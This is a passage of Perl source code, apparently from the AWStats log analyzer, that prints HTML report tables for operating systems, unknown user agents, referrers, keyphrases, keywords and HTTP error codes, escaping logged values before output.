           . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    } 
	&tab_head( "$title", 19, 0, 'unknownbrowser' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>" . _t("User agent") . " ("
	  . ( scalar keys %_unknownrefererbrowser_l )
	  . ")</th><th>" . _t("Last") . "</th></tr>\n";
	my $total_l = 0;
	my $count = 0;
	&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_unknownrefererbrowser_l,
		\%_unknownrefererbrowser_l );
	foreach my $key (@keylist) {
		my $useragent = XMLEncode( CleanXSS($key) );
		print
		  "<tr><td class=\"aws\">$useragent</td><td nowrap=\"nowrap\">"
		  . Format_Date( $_unknownrefererbrowser_l{$key}, 1 )
		  . "</td></tr>\n";
		$total_l += 1;
		$count++;
	}
	my $rest_l = ( scalar keys %_unknownrefererbrowser_l ) - $total_l;
	if ( $rest_l > 0 ) {
		print
"<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td>";
		print "<td>-</td>";
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the OS Detail frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowOSDetail{
	# Show os versions
	print "$Center<a name=\"osversions\">&nbsp;</a><br />";
	my $title = _t("Operating Systems");
	&tab_head( "$title", 19, 0, 'osversions' );
	print
"<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"2\">" . _t("Detailed") . "</th>";
	print
"<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th><th bgcolor=\"#$color_p\" width=\"80\">" . _t("Percent") . "</th>";
	print
"<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th>";
	print "</tr>\n";
	my $total_h = 0;
	my $total_p = 0;
	my $count = 0;
	&BuildKeyList( MinimumButNoZero( scalar keys %_os_h, 500 ),
		1, \%_os_h, \%_os_p );
	my %keysinkeylist = ();
	my $max_h = 1;
	my $max_p = 1;

	# Count total by family
	my %totalfamily_h = ();
	my %totalfamily_p = ();
	my $TotalFamily_h = 0;
	my $TotalFamily_p = 0;
  OSLOOP: foreach my $key (@keylist) {
		$total_h += $_os_h{$key};
		$total_p += $_os_p{$key};
		if ( $_os_h{$key} > $max_h ) { $max_h = $_os_h{$key}; }
		if ( $_os_p{$key} > $max_p ) { $max_p = $_os_p{$key}; }
		foreach my $family ( keys %OSFamily ) {
			if ( $key =~ /^$family/i ) {
				$totalfamily_h{$family} += $_os_h{$key};
				$totalfamily_p{$family} += $_os_p{$key};
				$TotalFamily_h          += $_os_h{$key};
				$TotalFamily_p          += $_os_p{$key};
				next OSLOOP;
			}
		}
	}

	# Write records grouped in a browser family
	foreach my $family ( keys %OSFamily ) {
		my $p_h = '&nbsp;';
		my $p_p = '&nbsp;';
		if ($total_h) {
			$p_h = int( $totalfamily_h{$family} / $total_h * 1000 ) / 10;
			$p_h = "$p_h %";
		}
		if ($total_p) {
			$p_p = int( $totalfamily_p{$family} / $total_p * 1000 ) / 10;
			$p_p = "$p_p %";
		}
		my $familyheadershown = 0;
		foreach my $key ( reverse sort keys %_os_h ) {
			if ( $key =~ /^$family(.*)/i ) {
				if ( !$familyheadershown ) {
					my $family_name = '';
					if ( $OSFamily{$family} ) {
						$family_name = $OSFamily{$family};
					}
					print
"<tr bgcolor=\"#F6F6F6\"><td class=\"aws\" colspan=\"2\"><b>$family_name</b></td>";
					print "<td><b>"
					  . Format_Number(int( $totalfamily_p{$family} ))
					  . "</b></td><td><b>$p_p</b></td>";
					print "<td><b>"
					  . Format_Number(int( $totalfamily_h{$family} ))
					  . "</b></td><td><b>$p_h</b></td><td>&nbsp;</td>";
					print "</tr>\n";
					$familyheadershown = 1;
				}
				$keysinkeylist{$key} = 1;
				my $ver = $1;
				my $p_h = '&nbsp;';
				my $p_p = '&nbsp;';
				if ($total_h) {
					$p_h = int( $_os_h{$key} / $total_h * 1000 ) / 10;
					$p_h = "$p_h %";
				}
				if ($total_p) {
					$p_p = int( $_os_p{$key} / $total_p * 1000 ) / 10;
					$p_p = "$p_p %";
				}
				print "<tr>";
				print "<td"
				  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
				  . "><img src=\"$DirIcons\/os\/$key.png\""
				  . AltTitle("")
				  . " /></td>";

				print "<td class=\"aws\">$OSHashLib{$key}</td>";
				my $bredde_h = 0;
				my $bredde_p = 0;
				if ( $max_h > 0 ) {
					$bredde_h =
					  int( $BarWidth * ( $_os_h{$key} || 0 ) / $max_h )
					  + 1;
				}
				if ( ( $bredde_h == 1 ) && $_os_h{$key} ) {
					$bredde_h = 2;
				}
				if ( $max_p > 0 ) {
					$bredde_p =
					  int( $BarWidth * ( $_os_p{$key} || 0 ) / $max_p )
					  + 1;
				}
				if ( ( $bredde_p == 1 ) && $_os_p{$key} ) {
					$bredde_p = 2;
				}
				print "<td>".Format_Number($_os_p{$key})."</td><td>$p_p</td>";
				print "<td>".Format_Number($_os_h{$key})."</td><td>$p_h</td>";
				print "<td class=\"aws\">";

				# alt and title are not provided to reduce page size
				if ($ShowOSStats) {
					print
"<img src=\"$DirIcons\/other\/$BarPng{'hp'}\" width=\"$bredde_p\" height=\"5\" /><br />";
					print
"<img src=\"$DirIcons\/other\/$BarPng{'hh'}\" width=\"$bredde_h\" height=\"5\" /><br />";
				}
				print "</td>";
				print "</tr>\n";
				$count++;
			}
		}
	}

	# Write other records
	my $familyheadershown = 0;
	foreach my $key (@keylist) {
		if ( $keysinkeylist{$key} ) { next; }
		if ( !$familyheadershown )  {
			my $p_h = '&nbsp;';
			my $p_p = '&nbsp;';
			if ($total_h) {
				$p_h =
				  int( ( $total_h - $TotalFamily_h ) / $total_h * 1000 ) /
				  10;
				$p_h = "$p_h %";
			}
			if ($total_p) {
				$p_p =
				  int( ( $total_p - $TotalFamily_p ) / $total_p * 1000 ) /
				  10;
				$p_p = "$p_p %";
			}
			print
"<tr bgcolor=\"#F6F6F6\"><td class=\"aws\" colspan=\"2\"><b>" . _t("Others") . "</b></td>";
			print "<td><b>"
			  . Format_Number(( $total_p - $TotalFamily_p ))
			  . "</b></td><td><b>$p_p</b></td>";
			print "<td><b>"
			  . Format_Number(( $total_h - $TotalFamily_h ))
			  . "</b></td><td><b>$p_h</b></td><td>&nbsp;</td>";
			print "</tr>\n";
			$familyheadershown = 1;
		}
		my $p_h = '&nbsp;';
		my $p_p = '&nbsp;';
		if ($total_h) {
			$p_h = int( $_os_h{$key} / $total_h * 1000 ) / 10;
			$p_h = "$p_h %";
		}
		if ($total_p) {
			$p_p = int( $_os_p{$key} / $total_p * 1000 ) / 10;
			$p_p = "$p_p %";
		}
		print "<tr>";
		if ( $key eq 'Unknown' ) {
			print "<td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/browser\/unknown.png\""
			  . AltTitle("")
			  . " /></td><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Unknown") . "</span></td>";
		}
		else {
			my $keywithoutcumul = $key;
			$keywithoutcumul =~ s/cumul$//i;
			my $libos = $OSHashLib{$keywithoutcumul}
			  || $keywithoutcumul;
			my $nameicon = $keywithoutcumul;
			$nameicon =~ s/[^\w]//g;
			print "<td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/os\/$nameicon.png\""
			  . AltTitle("")
			  . " /></td><td class=\"aws\">$libos</td>";
		}
		my $bredde_h = 0;
		my $bredde_p = 0;
		if ( $max_h > 0 ) {
			$bredde_h =
			  int( $BarWidth * ( $_os_h{$key} || 0 ) / $max_h ) + 1;
		}
		if ( ( $bredde_h == 1 ) && $_os_h{$key} ) { $bredde_h = 2; }
		if ( $max_p > 0 ) {
			$bredde_p =
			  int( $BarWidth * ( $_os_p{$key} || 0 ) / $max_p ) + 1;
		}
		if ( ( $bredde_p == 1 ) && $_os_p{$key} ) { $bredde_p = 2; }
		print "<td>".Format_Number($_os_p{$key})."</td><td>$p_p</td>";
		print "<td>".Format_Number($_os_h{$key})."</td><td>$p_h</td>";
		print "<td class=\"aws\">";

		# alt and title are not provided to reduce page size
		if ($ShowOSStats) {
			print
"<img src=\"$DirIcons\/other\/$BarPng{'hp'}\" width=\"$bredde_p\" height=\"5\" /><br />";
			print
"<img src=\"$DirIcons\/other\/$BarPng{'hh'}\" width=\"$bredde_h\" height=\"5\" /><br />";
		}
		print "</td>";
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Unknown OS Detail frame or static page
# Parameters:   $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowOSUnknown{
    my $NewLinkTarget = shift;
	print "$Center<a name=\"unknownos\">&nbsp;</a><br />\n";
	my $title = _t("Unknown OS");
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
       # extend the title to include the added link 
           $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
               "$AddLinkToExternalCGIWrapper" . "?section=UNKNOWNREFERER&baseName=$DirData/$PROG"
           . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
           . "&siteConfig=$SiteConfig" )
           . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    } 
    &tab_head( "$title", 19, 0, 'unknownos' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>" . _t("User agent") . " ("
	  . ( scalar keys %_unknownreferer_l )
	  . ")</th><th>" . _t("Last") . "</th></tr>\n";
	my $total_l = 0;
	my $count = 0;
	&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_unknownreferer_l,
		\%_unknownreferer_l );
	foreach my $key (@keylist) {
		my $useragent = XMLEncode( CleanXSS($key) );
		print "<tr><td class=\"aws\">$useragent</td>";
		print "<td nowrap=\"nowrap\">"
		  . Format_Date( $_unknownreferer_l{$key}, 1 ) . "</td>";
		print "</tr>\n";
		$total_l += 1;
		$count++;
	}
	my $rest_l = ( scalar keys %_unknownreferer_l ) - $total_l;
	if ( $rest_l > 0 ) {
		print
"<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td>";
		print "<td>-</td>";
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Referers frame or static page
# Parameters:   $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowReferers{
    my $NewLinkTarget = shift;
	print "$Center<a name=\"refererse\">&nbsp;</a><br />\n";
	my $title = _t("Refering search engines");
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
       # extend the title to include the added link 
           $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
               "$AddLinkToExternalCGIWrapper" . "?section=SEREFERRALS&baseName=$DirData/$PROG"
           . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
           . "&siteConfig=$SiteConfig" )
           . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    } 
    &tab_head( $title, 19, 0, 'refererse' );
	print
"<tr bgcolor=\"#$color_TableBGRowTitle\"><th>".Format_Number($TotalDifferentSearchEngines)." " . _t("Refering pages") . "</th>";
	print
"<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th><th bgcolor=\"#$color_p\" width=\"80\">" . _t("Percent") . "</th>";
	print
"<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th>";
	print "</tr>\n";
	my $total_s = 0;
	my $total_p = 0;
	my $total_h = 0;
	my $rest_p = 0;
	my $rest_h = 0;
	my $count = 0;
	&BuildKeyList(
		$MaxRowsInHTMLOutput,
		$MinHit{'Refer'},
		\%_se_referrals_h,
		(
			( scalar keys %_se_referrals_p )
			? \%_se_referrals_p
			: \%_se_referrals_h
		)
	);    # before 5.4 only hits were recorded

	foreach my $key (@keylist) {
		my $newreferer = $SearchEnginesHashLib{$key} || CleanXSS($key);
		my $p_p;
		my $p_h;
		if ($TotalSearchEnginesPages) {
			$p_p =
			  int( $_se_referrals_p{$key} / $TotalSearchEnginesPages *
				  1000 ) / 10;
		}
		if ($TotalSearchEnginesHits) {
			$p_h =
			  int( $_se_referrals_h{$key} / $TotalSearchEnginesHits *
				  1000 ) / 10;
		}
		print "<tr><td class=\"aws\">$newreferer</td>";
		print "<td>"
		  . (
			$_se_referrals_p{$key} ? $_se_referrals_p{$key} : '&nbsp;' )
		  . "</td>";
		print "<td>"
		  . ( $_se_referrals_p{$key} ? "$p_p %" : '&nbsp;' ) . "</td>";
		print "<td>".Format_Number($_se_referrals_h{$key})."</td>";
		print "<td>$p_h %</td>";
		print "</tr>\n";
		$total_p += $_se_referrals_p{$key};
		$total_h += $_se_referrals_h{$key};
		$count++;
	}
	if ($Debug) {
		debug(
"Total real / shown : $TotalSearchEnginesPages / $total_p - $TotalSearchEnginesHits / $total_h",
			2
		);
	}
	$rest_p = $TotalSearchEnginesPages - $total_p;
	$rest_h = $TotalSearchEnginesHits - $total_h;
	if ( $rest_p > 0 || $rest_h > 0 ) {
		my $p_p;
		my $p_h;
		if ($TotalSearchEnginesPages) {
			$p_p =
			  int( $rest_p / $TotalSearchEnginesPages * 1000 ) / 10;
		}
		if ($TotalSearchEnginesHits) {
			$p_h = int( $rest_h / $TotalSearchEnginesHits * 1000 ) / 10;
		}
		print
"<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td>";
		print "<td>" . ( $rest_p ? Format_Number($rest_p)  : '&nbsp;' ) . "</td>";
		print "<td>" . ( $rest_p ? "$p_p %" : '&nbsp;' ) . "</td>";
		print "<td>".Format_Number($rest_h)."</td>";
		print "<td>$p_h %</td>";
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Referer Pages frame or static page
# Parameters:   $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowRefererPages{
    my $NewLinkTarget = shift;
	print "$Center<a name=\"refererpages\">&nbsp;</a><br />\n";
	my $total_p = 0;
	my $total_h = 0;
	my $rest_p = 0;
	my $rest_h = 0;

	# Show filter form
	&HTMLShowFormFilter(
		"refererpagesfilter",
		$FilterIn{'refererpages'},
		$FilterEx{'refererpages'}
	);
	my $title = _t("Refering pages");
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
       # extend the title to include the added link 
           $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
               "$AddLinkToExternalCGIWrapper" . "?section=PAGEREFS&baseName=$DirData/$PROG"
           . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
           . "&siteConfig=$SiteConfig" )
           . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    }
    my $cpt   = 0;
	$cpt = ( scalar keys %_pagesrefs_h );
	&tab_head( "$title", 19, 0, 'refererpages' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>";
	if ( $FilterIn{'refererpages'} || $FilterEx{'refererpages'} ) {

		if ( $FilterIn{'refererpages'} ) {
			print _t("Filter") . " <b>$FilterIn{'refererpages'}</b>";
		}
		if ( $FilterIn{'refererpages'} && $FilterEx{'refererpages'} ) {
			print " - ";
		}
		if ( $FilterEx{'refererpages'} ) {
			print
			  _t("Exclude filter") . " <b>$FilterEx{'refererpages'}</b>";
		}
		if ( $FilterIn{'refererpages'} || $FilterEx{'refererpages'} ) {
			print ": ";
		}
		print "$cpt " . _t("Different refering pages");

		#if ($MonthRequired ne 'all') {
		#	if ($HTMLOutput{'refererpages'}) { print "<br />$Message[102]: $TotalDifferentPages $Message[28]"; }
		#}
	}
	else { print _t("Total") . ": ".Format_Number($cpt)." " . _t("Different refering pages"); }
	print "</th>";
	print
"<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th><th bgcolor=\"#$color_p\" width=\"80\">" . _t("Percent") . "</th>";
	print
"<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th>";
	print "</tr>\n";
	my $total_s = 0;
	my $count = 0;
	&BuildKeyList(
		$MaxRowsInHTMLOutput,
		$MinHit{'Refer'},
		\%_pagesrefs_h,
		(
			( scalar keys %_pagesrefs_p )
			? \%_pagesrefs_p
			: \%_pagesrefs_h
		)
	);

	foreach my $key (@keylist) {
		my $nompage = CleanXSS($key);
		if ( length($nompage) > $MaxLengthOfShownURL ) {
			$nompage =
			  substr( $nompage, 0, $MaxLengthOfShownURL ) . "...";
		}
		my $p_p;
		my $p_h;
		if ($TotalRefererPages) {
			$p_p =
			  int( $_pagesrefs_p{$key} / $TotalRefererPages * 1000 ) /
			  10;
		}
		if ($TotalRefererHits) {
			$p_h =
			  int( $_pagesrefs_h{$key} / $TotalRefererHits * 1000 ) /
			  10;
		}
		print "<tr><td class=\"aws\">";
		&HTMLShowURLInfo($key);
		print "</td>";
		print "<td>"
		  . ( $_pagesrefs_p{$key} ? Format_Number($_pagesrefs_p{$key}) : '&nbsp;' )
		  . "</td><td>"
		  . ( $_pagesrefs_p{$key} ? "$p_p %" : '&nbsp;' ) . "</td>";
		print "<td>"
		  . ( $_pagesrefs_h{$key} ? Format_Number($_pagesrefs_h{$key}) : '&nbsp;' )
		  . "</td><td>"
		  . ( $_pagesrefs_h{$key} ? "$p_h %" : '&nbsp;' ) . "</td>";
		print "</tr>\n";
		$total_p += $_pagesrefs_p{$key};
		$total_h += $_pagesrefs_h{$key};
		$count++;
	}
	if ($Debug) {
		debug(
"Total real / shown : $TotalRefererPages / $total_p - $TotalRefererHits / $total_h",
			2
		);
	}
	$rest_p = $TotalRefererPages - $total_p;
	$rest_h = $TotalRefererHits - $total_h;
	if ( $rest_p > 0 || $rest_h > 0 ) {
		my $p_p;
		my $p_h;
		if ($TotalRefererPages) {
			$p_p = int( $rest_p / $TotalRefererPages * 1000 ) / 10;
		}
		if ($TotalRefererHits) {
			$p_h = int( $rest_h / $TotalRefererHits * 1000 ) / 10;
		}
		print
"<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td>";
		print "<td>" . ( $rest_p ? Format_Number($rest_p)  : '&nbsp;' ) . "</td>";
		print "<td>" . ( $rest_p ? "$p_p %" : '&nbsp;' ) . "</td>";
		print "<td>".Format_Number($rest_h)."</td>";
		print "<td>$p_h %</td>";
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Key Phrases frame or static page
# Parameters:   $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowKeyPhrases{
	my $NewLinkTarget = shift;
	print "$Center<a name=\"keyphrases\">&nbsp;</a><br />\n";
    my $title = _t("Keyphrases");
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
       # extend the title to include the added link 
           $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
               "$AddLinkToExternalCGIWrapper" . "?section=SEARCHWORDS&baseName=$DirData/$PROG"
           . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
           . "&siteConfig=$SiteConfig" )
           . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    } 
	&tab_head( $title, 19, 0, 'keyphrases' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\""
	  . Tooltip(15)
	  . "><th>".Format_Number($TotalDifferentKeyphrases)." " . _t("Different keyphrases") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Percent") . "</th></tr>\n";
	my $total_s = 0;
	my $count = 0;
	&BuildKeyList(
		$MaxRowsInHTMLOutput, $MinHit{'Keyphrase'},
		\%_keyphrases,        \%_keyphrases
	);
	foreach my $key (@keylist) {
		my $mot;
  		# Convert coded keywords (utf8,...) to be correctly reported in HTML page.
		if ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {
			$mot = CleanXSS(
				DecodeKey_decodeutfkeys(
					$key, $PageCode || 'iso-8859-1'
				)
			);
		}
		else { $mot = CleanXSS( DecodeEncodedString($key) ); }
		my $p;
		if ($TotalKeyphrases) {
			$p =
			  int( $_keyphrases{$key} / $TotalKeyphrases * 1000 ) / 10;
		}
		print "<tr><td class=\"aws\">"
		  . XMLEncode($mot)
		  . "</td><td>$_keyphrases{$key}</td><td>$p %</td></tr>\n";
		$total_s += $_keyphrases{$key};
		$count++;
	}
	if ($Debug) {
		debug( "Total real / shown : $TotalKeyphrases / $total_s", 2 );
	}
	my $rest_s = $TotalKeyphrases - $total_s;
	if ( $rest_s > 0 ) {
		my $p;
		if ($TotalKeyphrases) {
			$p = int( $rest_s / $TotalKeyphrases * 1000 ) / 10;
		}
		print
"<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td><td>".Format_Number($rest_s)."</td>";
				print "<td>$p %</td></tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Keywords frame or static page
# Parameters:   $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowKeywords{
	my $NewLinkTarget = shift;
	print "$Center<a name=\"keywords\">&nbsp;</a><br />\n";
	my $title = _t("Keywords");
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
       # extend the title to include the added link 
           $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
               "$AddLinkToExternalCGIWrapper" . "?section=KEYWORDS&baseName=$DirData/$PROG"
           . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
           . "&siteConfig=$SiteConfig" )
           . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    } 
	&tab_head( $title, 19, 0, 'keywords' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\""
	  . Tooltip(15)
	  . "><th>".Format_Number($TotalDifferentKeywords)." " . _t("Different keywords") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Percent") . "</th></tr>\n";
	my $total_s = 0;
	my $count = 0;
	&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Keyword'},
		\%_keywords, \%_keywords );
	foreach my $key (@keylist) {
		my $mot;
  		# Convert coded keywords (utf8,...) to be correctly reported in HTML page.
		if ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {
			$mot = CleanXSS(
				DecodeKey_decodeutfkeys(
					$key, $PageCode || 'iso-8859-1'
				)
			);
		}
		else { $mot = CleanXSS( DecodeEncodedString($key) ); }
		my $p;
		if ($TotalKeywords) {
			$p = int( $_keywords{$key} / $TotalKeywords * 1000 ) / 10;
		}
		print "<tr><td class=\"aws\">"
		  . XMLEncode($mot)
		  . "</td><td>$_keywords{$key}</td><td>$p %</td></tr>\n";
		$total_s += $_keywords{$key};
		$count++;
	}
	if ($Debug) {
		debug( "Total real / shown : $TotalKeywords / $total_s", 2 );
	}
	my $rest_s = $TotalKeywords - $total_s;
	if ( $rest_s > 0 ) {
		my $p;
		if ($TotalKeywords) {
			$p = int( $rest_s / $TotalKeywords * 1000 ) / 10;
		}
		print
"<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td><td>".Format_Number($rest_s)."</td>";
		print "<td>$p %</td></tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the HTTP Error code frame or static page
# Parameters:   $code - the error code we're printing
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowErrorCodes{
	my $code = shift;
	my $title;
	my %customtitles = ( "404", _t("Page not found") );
	$title = $customtitles{$code} ? $customtitles{$code} :
	           (join(' ', ( ($httpcodelib{$code} ? $httpcodelib{$code} :
	           _t("Unknown error") ), "urls (HTTP code " . $code . ")" )));
	print "$Center<a name=\"errors$code\">&nbsp;</a><br />\n";
	&tab_head( $title, 19, 0, "errors$code" );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>" . _t("URL") . " ("
	  . Format_Number(( scalar keys %{$_sider_h{$code}} ))
	  . ")</th><th bgcolor=\"#$color_h\">" . _t("Hits") . "</th>";
	foreach (split(//, $ShowHTTPErrorsPageDetail)) {
		if ( $_ =~ /R/i ) {
			print "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Referer") . "</th>";
		} elsif ( $_ =~ /H/i ) {
			print "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Host") . "</th>";
		}
	}
	print "</tr>\n";
	my $total_h = 0;
	my $count = 0;
	&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%{$_sider_h{$code}},
		\%{$_sider_h{$code}} );
	foreach my $key (@keylist) {
		my $nompage = XMLEncode( CleanXSS($key) );

		#if (length($nompage)>$MaxLengthOfShownURL) { $nompage=substr($nompage,0,$MaxLengthOfShownURL)."..."; }
		my $referer = XMLEncode( CleanXSS( $_referer_h{$code}{$key} ) );
		my $host = XMLEncode( CleanXSS( $_err_host_h{$code}{$key} ) );
		print "<tr><td class=\"aws\">$nompage</td>";
		print "<td>".Format_Number($_sider_h{$code}{$key})."</td>";
		foreach (split(//, $ShowHTTPErrorsPageDetail)) {
			if ( $_ =~ /R/i ) {
				print "<td class=\"aws\">" . ( $referer ? "$referer" : "&nbsp;" ) . "</td>";
			} elsif ( $_ =~ /H/i ) {
				print "<td class=\"aws\">" . ( $host ? "$host" : "&nbsp;" ) . "</td>";
			}
		}
		print "</tr>\n";
		my $total_s += $_sider_h{$code}{$key};
		$count++;
	}

# TODO Build TotalErrorHits
#			if ($Debug) { debug("Total real / shown : $TotalErrorHits / $total_h",2); }
#			$rest_h=$TotalErrorHits-$total_h;
#			if ($rest_h > 0) {
#				my $p;
#				if ($TotalErrorHits) { $p=int($rest_h/$TotalErrorHits*1000)/10; }
#				print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[30]</span></td>";
#				print "<td>$rest_h</td>";
#				print "<td>...</td>";
#				print "</tr>\n";
#			}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Loops through any defined extra sections and dumps the info to HTML
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowExtraSections{
	foreach my $extranum ( 1 .. @ExtraName - 1 ) {
		my $total_p = 0;
		my $total_h = 0;
		my $total_k = 0;
		
		if ( $HTMLOutput{"allextra$extranum"} ) {
			if ($Debug) { debug( "ExtraName$extranum", 2 ); }
			print "$Center<a name=\"extra$extranum\">&nbsp;</a><br />";
			my $title = $ExtraName[$extranum];
			&tab_head( "$title", 19, 0, "extra$extranum" );
			print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
			print "<th>" . $ExtraFirstColumnTitle[$extranum] . "</th>";

			if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
				print
"<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th>";
			}
			if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
				print
"<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>";
			}
			if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
				print
"<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>";
			}
			if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
				print "<th width=\"120\">" . _t("Last") . "</th>";
			}
			print "</tr>\n";
			$total_p = $total_h = $total_k = 0;

 #$max_h=1; foreach (values %_login_h) { if ($_ > $max_h) { $max_h = $_; } }
 #$max_k=1; foreach (values %_login_k) { if ($_ > $max_k) { $max_k = $_; } }
			my $count = 0;
			if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
				&BuildKeyList(
					$MaxRowsInHTMLOutput,
					$MinHitExtra[$extranum],
					\%{ '_section_' . $extranum . '_h' },
					\%{ '_section_' . $extranum . '_p' }
				);
			}
			else {
				&BuildKeyList(
					$MaxRowsInHTMLOutput,
					$MinHitExtra[$extranum],
					\%{ '_section_' . $extranum . '_h' },
					\%{ '_section_' . $extranum . '_h' }
				);
			}
			my %keysinkeylist = ();
			foreach my $key (@keylist) {
				$keysinkeylist{$key} = 1;
				my $firstcol = CleanXSS( DecodeEncodedString($key) );
				$total_p += ${ '_section_' . $extranum . '_p' }{$key};
				$total_h += ${ '_section_' . $extranum . '_h' }{$key};
				$total_k += ${ '_section_' . $extranum . '_k' }{$key};
				print "<tr>";
				printf(
"<td class=\"aws\">$ExtraFirstColumnFormat[$extranum]</td>",
					$firstcol, $firstcol, $firstcol, $firstcol, $firstcol );
				if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
					print "<td>"
					  . ${ '_section_' . $extranum . '_p' }{$key} . "</td>";
				}
				if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
					print "<td>"
					  . ${ '_section_' . $extranum . '_h' }{$key} . "</td>";
				}
				if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
					print "<td>"
					  . Format_Bytes(
						${ '_section_' . $extranum . '_k' }{$key} )
					  . "</td>";
				}
				if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
					print "<td>"
					  . (
